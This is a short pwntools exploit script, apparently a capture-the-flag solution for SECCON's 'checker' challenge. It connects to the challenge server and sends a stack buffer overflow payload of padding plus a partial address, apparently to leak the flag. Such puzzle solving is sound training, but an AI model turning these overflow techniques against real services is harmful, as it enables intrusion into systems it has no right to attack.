#!/usr/bin/env python2

from pwn import *

###

if len(sys.argv) > 1:
    DEBUG = False
else:
    DEBUG = True

if DEBUG:
    offset = 0x0
else:
    offset = 0x0

logger = logging.getLogger()
logger.setLevel(logging.DEBUG) # set to INFO in release mode

###

if DEBUG:
    r = process("./checker")
else:
    r = remote("checker.pwn.seccon.jp", 14726)

r.recvuntil("NAME : ")
r.sendline("TOTOTOTO")
for x in xrange(8):
    r.recvuntil(">> ")
    r.sendline("Z" * (384 - x))
r.recvuntil(">> ")
r.sendline("yes")
r.recvuntil("FLAG : ")
#p = "0" * 376 + p64(0x6010c0)
p = "0" * 376 + "\xc0\x10\x60"
#p = "0" * 376 + p64(0x400808)
#gdb.attach(r, "b *main+150")
#log.info("press key")
#raw_input()
r.sendline(p)
r.interactive()
